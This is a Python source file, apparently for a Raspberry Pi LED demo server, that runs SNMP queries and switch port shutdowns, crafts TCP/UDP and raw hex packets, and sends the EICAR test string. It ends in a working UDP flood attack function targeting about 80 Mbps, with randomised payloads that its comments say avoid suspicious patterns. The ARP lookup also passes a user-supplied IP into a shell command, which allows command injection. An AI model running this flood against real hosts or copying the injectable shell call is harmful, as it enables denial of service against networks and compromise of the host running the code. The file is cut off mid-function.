#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Command Executor for Raspberry Pi LED Server
Handles shell commands like ping and SNMP operations
"""

import subprocess
import shlex
import threading
import time
import socket
import struct
import binascii
import psutil
import netifaces
from config import *


class CommandExecutor:
    def __init__(self, gpio_controller):
        """Initialize command executor with GPIO controller reference"""
        self.gpio = gpio_controller
    
    def _run(self, cmd: str, timeout=DEFAULT_TIMEOUT):
        """Execute a shell command with timeout"""
        try:
            cp = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=timeout)
            return cp.returncode, cp.stdout.strip(), cp.stderr.strip()
        except subprocess.TimeoutExpired:
            return 124, "", f"timeout after {timeout}s"
    
    
    
    def snmp_walk(self, target: str, community: str = "public"):
        """Execute SNMP walk with LED visualization"""
        if not target.strip():
            return {"ok": False, "error": "target required"}
        
        self.gpio.stop_anim()
        self.gpio._off_all()
        
        cmd = f"snmpwalk -v2c -c {community} {target} 1.3.6.1.2.1.31.1.1.1.1"
        code, out, err = self._run(cmd, timeout=SNMP_TIMEOUT)
        
        # Visual feedback - 15Hz animation for success
        if code == 0:
            def success_animation():
                seq = [
                    (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),
                ]
                # Run once at 15Hz
                for st in seq:
                    self.gpio._apply_states(*st)
                    time.sleep(0.067)  # 15Hz = 0.067s per step
                self.gpio._off_all()
            
            threading.Thread(target=success_animation, daemon=True).start()
        else:
            # Flash red LED for error
            self.gpio.strobe_error()
        
        return {
            "ok": (code == 0),
            "cmd": cmd,
            "code": code,
            "stdout": out,
            "stderr": err
        }
    
    def snmp_portdown(self, target: str, ifindex: str, community: str = "private"):
        """Set SNMP port to down with LED visualization"""
        if not (target.strip() and ifindex.strip().isdigit()):
            return {"ok": False, "error": "target and numeric ifindex required"}
        
        self.gpio.stop_anim()
        self.gpio._off_all()
        
        set_oid = f"1.3.6.1.2.1.2.2.1.7.{ifindex}"
        set_cmd = f"snmpset -v2c -c {community} {target} {set_oid} i 2"
        code, out, err = self._run(set_cmd, timeout=6)
        
        ok = (code == 0)
        
        if ok:
            # Success animation - 1→16 pattern for port down at 15Hz, once
            def port_down_animation():
                # Pattern: 1→2→3→4→5→6→7→8→9→10→11→12→13→14→15→16 (all GPIO pins)
                seq = [
                    (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),  # 17 (1)
                    (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),  # 27 (2)
                    (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),  # 22 (3)
                    (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),  # 10 (4)
                    (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),  # 9  (5)
                    (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),  # 5  (6)
                    (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),  # 6  (7)
                    (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),  # 26 (8)
                    (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),  # 16 (9)
                    (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),  # 14 (10)
                    (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),  # 18 (11)
                    (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),  # 23 (12)
                    (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),  # 24 (13)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),  # 25 (14)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),  # 20 (15)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),   # 21 (16)
                ]
                # Run animation once at 15Hz
                for st in seq:
                    self.gpio._apply_states(*st)
                    time.sleep(0.067)  # 15Hz = 0.067s per step
                self.gpio._off_all()
            
            threading.Thread(target=port_down_animation, daemon=True).start()
        else:
            # Error animation
            self.gpio.strobe_error()
        
        # Confirm the change
        get_oid = f"1.3.6.1.2.1.2.2.1.8.{ifindex}"
        get_cmd = f"snmpget -v2c -c public {target} {get_oid}"
        gcode, gout, gerr = self._run(get_cmd, timeout=5)
        
        return {
            "ok": ok,
            "set_cmd": set_cmd,
            "set_code": code,
            "set_stdout": out,
            "set_stderr": err,
            "confirm_cmd": get_cmd,
            "confirm_code": gcode,
            "confirm_stdout": gout,
            "confirm_stderr": gerr
        }
    
    def snmp_portup(self, target: str, ifindex: str, community: str = "private"):
        """Set SNMP port to up with LED visualization"""
        if not (target.strip() and ifindex.strip().isdigit()):
            return {"ok": False, "error": "target and numeric ifindex required"}
        
        self.gpio.stop_anim()
        self.gpio._off_all()
        
        set_oid = f"1.3.6.1.2.1.2.2.1.7.{ifindex}"
        set_cmd = f"snmpset -v2c -c {community} {target} {set_oid} i 1"
        code, out, err = self._run(set_cmd, timeout=6)
        
        ok = (code == 0)
        
        if ok:
            # Success animation - 16→1 pattern for port up at 15Hz, once
            def port_up_animation():
                # Pattern: 16→15→14→13→12→11→10→9→8→7→6→5→4→3→2→1 (reverse order)
                seq = [
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),   # 21 (16)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),  # 20 (15)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),  # 25 (14)
                    (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),  # 24 (13)
                    (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),  # 23 (12)
                    (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),  # 18 (11)
                    (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),  # 14 (10)
                    (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),  # 16 (9)
                    (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),  # 26 (8)
                    (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),  # 6  (7)
                    (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),  # 5  (6)
                    (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),  # 9  (5)
                    (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),  # 10 (4)
                    (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),  # 22 (3)
                    (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),  # 27 (2)
                    (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),  # 17 (1)
                ]
                # Run animation once at 15Hz
                for st in seq:
                    self.gpio._apply_states(*st)
                    time.sleep(0.067)  # 15Hz = 0.067s per step
                self.gpio._off_all()
            
            threading.Thread(target=port_up_animation, daemon=True).start()
        else:
            # Error animation
            self.gpio.strobe_error()
        
        # Confirm the change
        get_oid = f"1.3.6.1.2.1.2.2.1.8.{ifindex}"
        get_cmd = f"snmpget -v2c -c public {target} {get_oid}"
        gcode, gout, gerr = self._run(get_cmd, timeout=5)
        
        return {
            "ok": ok,
            "set_cmd": set_cmd,
            "set_code": code,
            "set_stdout": out,
            "set_stderr": err,
            "confirm_cmd": get_cmd,
            "confirm_code": gcode,
            "confirm_stdout": gout,
            "confirm_stderr": gerr
        }
    
    def snmp_get_port_status(self, target: str, ifindex: str, community: str = "public"):
        """Get the operational status of a specific port"""
        if not (target.strip() and ifindex.strip()):
            return {"ok": False, "error": "target and ifindex required"}
        
        get_oid = f"1.3.6.1.2.1.2.2.1.8.{ifindex}"
        get_cmd = f"snmpget -v2c -c {community} {target} {get_oid}"
        code, out, err = self._run(get_cmd, timeout=5)
        
        status = None
        if code == 0 and out:
            # Extract status value from SNMP output
            # Example output: "IF-MIB::ifOperStatus.7 = INTEGER: up(1)"
            import re
            match = re.search(r'INTEGER:\s*\w*\((\d+)\)', out)
            if match:
                status = match.group(1)
            else:
                # Fallback: look for just the number
                match = re.search(r'INTEGER:\s*(\d+)', out)
                if match:
                    status = match.group(1)
        
        return {
            "ok": (code == 0),
            "cmd": get_cmd,
            "code": code,
            "stdout": out,
            "stderr": err,
            "status": status
        }
    
    def snmp_get_interfaces(self, target: str, community: str = "public"):
        """Get list of network interfaces with their status"""
        if not target.strip():
            return {"ok": False, "error": "target required"}
        
        self.gpio.stop_anim()
        self.gpio._off_all()
        
        # Get interface names
        name_cmd = f"snmpwalk -v2c -c {community} {target} 1.3.6.1.2.1.31.1.1.1.1"
        name_code, name_out, name_err = self._run(name_cmd, timeout=SNMP_TIMEOUT)
        
        # Get interface admin status
        admin_cmd = f"snmpwalk -v2c -c {community} {target} 1.3.6.1.2.1.2.2.1.7"
        admin_code, admin_out, admin_err = self._run(admin_cmd, timeout=SNMP_TIMEOUT)
        
        # Get interface operational status
        oper_cmd = f"snmpwalk -v2c -c {community} {target} 1.3.6.1.2.1.2.2.1.8"
        oper_code, oper_out, oper_err = self._run(oper_cmd, timeout=SNMP_TIMEOUT)
        
        ok = (name_code == 0 and admin_code == 0 and oper_code == 0)
        
        if ok:
            # Visual feedback - 15Hz animation
            def success_animation():
                seq = [
                    (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),
                ]
                # Run once at 15Hz
                for st in seq:
                    self.gpio._apply_states(*st)
                    time.sleep(0.067)  # 15Hz = 0.067s per step
                self.gpio._off_all()
            
            threading.Thread(target=success_animation, daemon=True).start()
        
        return {
            "ok": ok,
            "interfaces": {
                "names": name_out,
                "admin_status": admin_out,
                "oper_status": oper_out
            },
            "commands": {
                "names": name_cmd,
                "admin": admin_cmd,
                "oper": oper_cmd
            },
            "errors": {
                "names": name_err,
                "admin": admin_err,
                "oper": oper_err
            }
        }
    
    def craft_and_send_packet(self, packet_data):
        """Craft and send a custom packet with specified parameters"""
        print(f"DEBUG CRAFT: Starting craft_and_send_packet with data: {packet_data}")
        try:
            # Extract packet parameters
            target_ip = packet_data.get('target_ip', '').strip()
            target_port = int(packet_data.get('target_port', 80))
            protocol = packet_data.get('protocol', 'tcp').lower()
            payload = packet_data.get('payload', '')
            source_ip = packet_data.get('source_ip', '')
            source_port = int(packet_data.get('source_port', 12345))
            source_mac = packet_data.get('source_mac', '').strip()
            target_mac = packet_data.get('target_mac', '').strip()
            
            if not target_ip:
                return {"ok": False, "error": "Target IP is required"}
            
            self.gpio.stop_anim()
            self.gpio._off_all()
            
            if protocol == 'tcp':
                result = self._send_tcp_packet(source_ip, source_port, target_ip, target_port, payload, source_mac, target_mac)
            elif protocol == 'udp':
                result = self._send_udp_packet(source_ip, source_port, target_ip, target_port, payload, source_mac, target_mac)
            else:
                return {"ok": False, "error": f"Unsupported protocol: {protocol}"}
            
            # Success animation - Same as SNMP port down (1→16 at 15Hz, once)
            if result["ok"]:
                def success_animation():
                    seq = [
                        (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),
                    ]
                    # Single pass at 15Hz
                    for st in seq:
                        self.gpio._apply_states(*st)
                        time.sleep(0.067)  # 15Hz
                    self.gpio._off_all()
                
                threading.Thread(target=success_animation, daemon=True).start()
            else:
                # Error animation
                self.gpio.strobe_error()
            
            return result
            
        except Exception as e:
            self.gpio.strobe_error()
            return {"ok": False, "error": f"Packet crafting failed: {str(e)}"}
    
    def get_target_mac(self, target_ip):
        """Get MAC address of target IP using ARP lookup"""
        try:
            # Try ARP lookup on Windows/Linux
            if hasattr(socket, 'AF_PACKET') or hasattr(socket, 'AF_LINK'):
                # Linux/Unix ARP lookup
                arp_cmd = f"arp -n {target_ip}"
            else:
                # Windows ARP lookup
                arp_cmd = f"arp -a {target_ip}"
            
            result = subprocess.run(arp_cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                # Parse ARP output to extract MAC address
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if target_ip in line:
                        # Look for MAC address pattern (xx:xx:xx:xx:xx:xx or xx-xx-xx-xx-xx-xx)
                        import re
                        mac_pattern = r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}'
                        match = re.search(mac_pattern, line)
                        if match:
                            mac = match.group(0).replace('-', ':').upper()
                            return {"ok": True, "mac": mac}
            
            return {"ok": False, "error": f"Could not resolve MAC for {target_ip}"}
            
        except Exception as e:
            return {"ok": False, "error": f"ARP lookup failed: {str(e)}"}
    
    def get_source_mac(self):
        """Get MAC address of the primary network interface"""
        try:
            # Get the default gateway interface
            gateways = netifaces.gateways()
            default_interface = gateways['default'][netifaces.AF_INET][1]
            
            # Get MAC address of the default interface
            interface_info = netifaces.ifaddresses(default_interface)
            if netifaces.AF_LINK in interface_info:
                mac = interface_info[netifaces.AF_LINK][0]['addr'].upper()
                return {"ok": True, "mac": mac}
            
            return {"ok": False, "error": "Could not get source MAC address"}
            
        except Exception as e:
            # Fallback: try to get any available MAC
            try:
                for interface in netifaces.interfaces():
                    if interface.startswith(('eth', 'wlan', 'en', 'wl')):
                        interface_info = netifaces.ifaddresses(interface)
                        if netifaces.AF_LINK in interface_info:
                            mac = interface_info[netifaces.AF_LINK][0]['addr'].upper()
                            if mac != '00:00:00:00:00:00':
                                return {"ok": True, "mac": mac}
                
                return {"ok": False, "error": "No valid network interface found"}
            except:
                return {"ok": False, "error": f"MAC lookup failed: {str(e)}"}
    
    def _send_tcp_packet(self, src_ip, src_port, dst_ip, dst_port, payload, src_mac='', dst_mac=''):
        """Send a TCP packet with custom payload (using regular socket, no admin privileges required)"""
        try:
            # Use regular TCP socket instead of raw socket to avoid permission issues
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)  # 3 second timeout (reduced for faster feedback)
            
            # Bind to specific source if provided
            if src_ip and src_port:
                try:
                    sock.bind((src_ip, src_port))
                except:
                    # If binding fails, let system choose source
                    pass
            
            # Connect and send payload
            sock.connect((dst_ip, dst_port))
            
            # Convert payload to bytes if it's a string
            if isinstance(payload, str):
                payload_bytes = payload.encode('utf-8')
            else:
                payload_bytes = payload
                
            sock.send(payload_bytes)
            sock.close()
            
            return {
                "ok": True,
                "message": f"TCP packet sent to {dst_ip}:{dst_port}",
                "payload_size": len(payload_bytes),
                "protocol": "TCP",
                "note": "Using standard TCP socket (no raw socket privileges required)"
            }
            
        except socket.timeout:
            return {"ok": False, "error": f"Connection timeout - No service responding on {dst_ip}:{dst_port}. Try port 22 (SSH), 443 (HTTPS), or 80 on a web server."}
        except ConnectionRefusedError:
            return {"ok": False, "error": f"Connection refused - Port {dst_port} closed on {dst_ip}. The target is reachable but not accepting connections on this port."}
        except socket.gaierror as e:
            return {"ok": False, "error": f"DNS/Address error: {str(e)}"}
        except Exception as e:
            return {"ok": False, "error": f"TCP packet send failed: {str(e)}"}
    
    def _send_udp_packet(self, src_ip, src_port, dst_ip, dst_port, payload, src_mac='', dst_mac=''):
        """Send a UDP packet with custom payload"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)  # 3 second timeout
            
            # Bind to specific source if provided
            if src_ip and src_port:
                try:
                    sock.bind((src_ip, src_port))
                except:
                    # If binding fails, let system choose source
                    pass
            
            # Convert payload to bytes if it's a string
            if isinstance(payload, str):
                payload_bytes = payload.encode('utf-8')
            else:
                payload_bytes = payload
            
            sock.sendto(payload_bytes, (dst_ip, dst_port))
            sock.close()
            
            return {
                "ok": True,
                "message": f"UDP packet sent to {dst_ip}:{dst_port}",
                "payload_size": len(payload_bytes),
                "protocol": "UDP"
            }
            
        except socket.timeout:
            return {"ok": False, "error": f"UDP send timeout to {dst_ip}:{dst_port}"}
        except socket.gaierror as e:
            return {"ok": False, "error": f"DNS/Address error: {str(e)}"}
        except Exception as e:
            return {"ok": False, "error": f"UDP packet send failed: {str(e)}"}
    

    
    def send_raw_packet(self, packet_data):
        """Send a raw packet from hex string"""
        try:
            target_ip = packet_data.get('target_ip', '').strip()
            target_port = int(packet_data.get('target_port', 80))
            hex_payload = packet_data.get('payload', '').strip()
            
            if not target_ip or not hex_payload:
                return {"ok": False, "error": "Target IP and hex payload are required"}
            
            # Convert hex string to bytes
            try:
                raw_bytes = binascii.unhexlify(hex_payload.replace(' ', '').replace(':', ''))
            except (ValueError, binascii.Error) as e:
                return {"ok": False, "error": f"Invalid hex payload: {str(e)}"}
            
            self.gpio.stop_anim()
            self.gpio._off_all()
            
            # Send raw packet via UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(raw_bytes, (target_ip, target_port))
            sock.close()
            
            # Success animation - Same as SNMP port down (1→16 at 15Hz, once)
            def success_animation():
                seq = [
                    (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),
                ]
                # Single pass at 15Hz
                for st in seq:
                    self.gpio._apply_states(*st)
                    time.sleep(0.067)  # 15Hz
                self.gpio._off_all()
            
            threading.Thread(target=success_animation, daemon=True).start()
            
            return {
                "ok": True,
                "message": f"Raw packet sent to {target_ip}:{target_port}",
                "payload_size": len(raw_bytes),
                "hex_payload": hex_payload
            }
            
        except Exception as e:
            self.gpio.strobe_error()
            return {"ok": False, "error": f"Raw packet send failed: {str(e)}"}
    
    def send_eicar_packet(self, packet_data):
        """Send EICAR test string as packet payload"""
        try:
            target_ip = packet_data.get('target_ip', '').strip()
            target_port = int(packet_data.get('target_port', 80))
            protocol = packet_data.get('protocol', 'tcp').lower()
            
            if not target_ip:
                return {"ok": False, "error": "Target IP is required"}
            
            # EICAR test string
            eicar_string = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
            
            self.gpio.stop_anim()
            self.gpio._off_all()
            
            if protocol == 'tcp':
                result = self._send_tcp_packet('', 12345, target_ip, target_port, eicar_string)
            else:
                result = self._send_udp_packet('', 12345, target_ip, target_port, eicar_string)
            
            # Success animation - Same as SNMP port down (1→16 at 15Hz, once)
            if result["ok"]:
                def eicar_animation():
                    seq = [
                        (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),
                        (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),
                    ]
                    # Single pass at 15Hz
                    for st in seq:
                        self.gpio._apply_states(*st)
                        time.sleep(0.067)  # 15Hz
                    self.gpio._off_all()
                
                threading.Thread(target=eicar_animation, daemon=True).start()
            else:
                self.gpio.strobe_error()
            
            result["eicar_payload"] = eicar_string
            return result
            
        except Exception as e:
            self.gpio.strobe_error()
            return {"ok": False, "error": f"EICAR packet send failed: {str(e)}"}
    
    def start_udp_flood(self, flood_data):
        """Start UDP flood attack targeting ~80Mbps bandwidth"""
        try:
            target_ip = flood_data.get('target_ip', '').strip()
            target_port = int(flood_data.get('target_port', 53))  # Default to DNS port
            packet_size = int(flood_data.get('packet_size', 1024))  # Default 1KB packets
            duration = flood_data.get('duration', 0)  # 0 = continuous
            
            if not target_ip:
                return {"ok": False, "error": "Target IP is required"}
            
            # Calculate packets per second for ~80Mbps
            # 80Mbps = 80 * 1024 * 1024 bits/sec = 83,886,080 bits/sec
            # Convert to bytes/sec = 10,485,760 bytes/sec
            target_bandwidth = 10485760  # bytes per second for 80Mbps
            packets_per_second = target_bandwidth // packet_size
            delay_between_packets = 1.0 / packets_per_second if packets_per_second > 0 else 0.001
            
            self.gpio.stop_anim()
            self.gpio._off_all()
            
            # Create normal UDP payload - no padding, just realistic data
            import random
            import string
            
            # Generate normal-looking UDP data without suspicious patterns
            if packet_size <= 32:
                # Very small packets - minimal realistic data
                payload = b'UDP' + str(random.randint(1000, 9999)).encode()
            elif packet_size <= 128:
                # Small packets - simulate DNS queries or similar
                query_data = ''.join(random.choices(string.ascii_lowercase, k=min(packet_size-10, 20)))
                payload = f"query:{query_data}".encode()
            else:
                # Larger packets - simulate normal application data
                # Create realistic JSON-like or HTTP-like content
                data_content = {
                    'type': 'data_transfer',
                    'seq': random.randint(1, 65535),
                    'payload': ''.join(random.choices(string.ascii_letters + string.digits, k=min(packet_size-100, 200)))
                }
                payload = str(data_content).encode()
            
            # Trim to exact size if needed (no padding)
            if len(payload) > packet_size:
                payload = payload[:packet_size]
            elif len(payload) < packet_size:
                # If we need more data, add realistic content (not repetitive padding)
                additional_data = ''.join(random.choices(string.ascii_letters + string.digits + ' .,', k=packet_size - len(payload)))
                payload += additional_data.encode()
            
            # Store flood state
            self.flood_active = True
            self.flood_stats = {
                'packets_sent': 0,
                'bytes_sent': 0,
                'start_time': time.time(),
                'target_ip': target_ip,
                'target_port': target_port
            }
            
            # LED animation for flood - 100Hz rapid fire
            def led_animation_worker():
                """Worker function for 100Hz LED animation during flood"""
                seq = [
                    (True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False, False),  # 17 (1)
                    (False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False, False),  # 27 (2)
                    (False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False, False),  # 22 (3)
                    (False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False, False),  # 10 (4)
                    (False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False, False),  # 9  (5)
                    (False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False, False),  # 5  (6)
                    (False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False, False),  # 6  (7)
                    (False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False, False),  # 26 (8)
                    (False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False, False),  # 16 (9)
                    (False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False, False),  # 14 (10)
                    (False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False, False),  # 18 (11)
                    (False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False, False),  # 23 (12)
                    (False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False, False),  # 24 (13)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False, False),  # 25 (14)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, True,  False),  # 20 (15)
                    (False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, True),   # 21 (16)
                ]
                try:
                    while self.flood_active:
                        for st in seq:
                            if not self.flood_active:
                                break
                            self.gpio._apply_states(*st)
                            time.sleep(0.01)  # 100Hz
                except Exception as e:
                    print(f"LED animation error: {e}")
                finally:
                    self.gpio._off_all()
            
            def flood_worker():
                """Worker function to send UDP packets"""
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    
                    start_time = time.time()
                    
                    while self.flood_active:
                        if duration > 0 and (time.time() - start_time) >= duration:
                            break
                            
                        try:
                            # Generate unique payload for each packet (no patterns)
                            if self.flood_stats['packets_sent'] % 50 == 0:
                                # Every 50th packet, generate completely new realistic data
                                import random
                                import string
                                
                                if packet_size <= 32:
                                    current_payload = b'UDP' + str(random.randint(1000, 9999)).encode()
                                elif packet_size <= 128:
                                    query_data = ''.join(random.choices(string.ascii_lowercase, k=min(packet_size-10, 20)))
                                    current_payload = f"query:{query_data}".encode()
                                else:
                                    data_content = {
                                        'type': 'data_transfer',
                                        'seq': random.randint(1, 65535),
                                        'payload': ''.join(random.choices(string.ascii_letters + string.digits, k=min(packet_size-100, 200)))
                                    }
                                    current_payload = str(data_content).encode()
                                
                                # Adjust size without padding
                                if len(current_payload) > packet_size:
                                    current_payload = current_payload[:packet_size]
                                elif len(current_payload) < packet_size:
                                    additional_data = ''.join(random.choices(string.ascii_letters + string.digits + ' .,', k=packet_size - len(current_payload)))
                                    current_payload += additional_data.encode()
                                
                                sock.sendto(current_payload, (target_ip, target_port))
                            else:
                                sock.sendto(payload, (target_ip, target_port))
                                
                            self.flood_stats['packets_sent'] += 1
                            self.flood_stats['bytes_sent'] += packet_size
                            
                            # Small delay to control bandwidth
                            if delay_between_packets > 0:
                                time.sleep(delay_between_packets)
                                
                        except Exception as e:
                            print(f"Flood packet error: {e}")
                            continue
                    
                    sock.close()
                        
                except Exception as e:
                    print(f"Flood worker error: {e}")
                    self.flood_active = False
            
            # Start LED animation in background thread
            self.led_animation_thread = threading.Thread(target=led_animation_worker, daemon=True)
            self.led_animation_thread.start()
            
            # Start flood in background thread
            self.flood_thread = threading.Thread(target=flood_worker, daemon=True)
            self.flood_thread.start()
            
            return {
                "ok": True,
                "message": f"UDP flood started against {target_ip}:{target_port}",
                "target_bandwidth_mbps": 80,
